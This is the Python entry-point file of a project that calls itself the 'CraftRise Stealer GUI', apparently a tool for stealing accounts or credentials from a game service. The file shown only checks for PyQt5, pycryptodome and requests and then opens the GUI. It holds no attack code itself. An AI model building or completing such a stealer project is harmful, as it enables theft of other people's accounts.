"""Application entry point."""

from __future__ import annotations

import logging
import sys


def _ensure_dependencies() -> bool:
    """Verify that required runtime packages are importable.

    Returns:
        True if all critical imports succeed.
    """
    required = [
        ("PyQt5.QtWidgets", "PyQt5"),
        ("Crypto.Cipher", "pycryptodome"),
        ("requests", "requests"),
    ]
    missing: list[str] = []
    for module, package in required:
        try:
            __import__(module)
        except ImportError:
            missing.append(package)

    if missing:
        print(f"Missing dependencies: {', '.join(missing)}", file=sys.stderr)
        print("Install them with: pip install -r requirements.txt", file=sys.stderr)
        return False
    return True


def main() -> int:
    """Launch the CraftRise Stealer GUI."""
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    )

    if not _ensure_dependencies():
        return 1

    try:
        from PyQt5.QtWidgets import QApplication
        from src.gui.main_window import MainWindow

        app = QApplication(sys.argv)
        window = MainWindow()
        window.show()
        return app.exec_()
    except Exception as exc:
        logging.exception("Application failed to start")
        return 1


if __name__ == "__main__":
    sys.exit(main())
